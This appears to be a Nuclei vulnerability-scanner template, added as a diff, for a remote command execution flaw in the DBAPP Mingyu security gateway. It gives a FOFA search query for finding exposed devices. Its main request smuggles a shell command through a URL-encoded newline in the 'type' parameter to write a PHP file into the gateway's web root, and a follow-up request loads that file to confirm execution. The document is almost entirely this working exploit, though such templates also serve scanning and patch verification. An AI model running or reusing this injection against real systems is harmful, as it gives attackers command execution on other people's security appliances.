@@ -1,0 +1,32 @@
+id: dbapp-mingyu-aaa_portal_auth_config_reset-rce
+
+info:
+  name: 安恒明御安全网关 aaa_portal_auth_config_reset 远程命令执行漏洞
+  author: fgz
+  severity: critical
+  description: 明御安全网关秉持安全可视、简单 有效的只理念，以资产为视角，构建全流程防御的下一代安全防护体系，并融合传统防火墙、入侵检测、入侵防御系统、防病毒网关、上网行为管控、VPN网关、威胁情报等安全模块于一体的智慧化安全网关。明御安全网关aaa_portal_auth_config_reset接口处存在RCE漏洞，攻击者通过漏洞可以获取服务器权限.
+  metadata:
+    max-request: 1
+    fofa-query: title="明御安全网关"
+    verified: true
+requests:
+  - raw:
+      - |+
+        GET /webui/?g=aaa_portal_auth_config_reset&type=%0aecho%20%27%3C%3Fphp%20echo%20%22{{randstr}}%22%3B%20phpinfo%28%29%3B%20%3F%3E%27%20%3E%3E%20%2Fusr%2Flocal%2Fwebui%2F{{randstr}}.php%0a HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Connection: close
+
+      - |
+        GET /{{randstr}}.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Accept-Encoding: gzip
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && status_code_2 == 200 && contains(body_2, '{{randstr}}')"
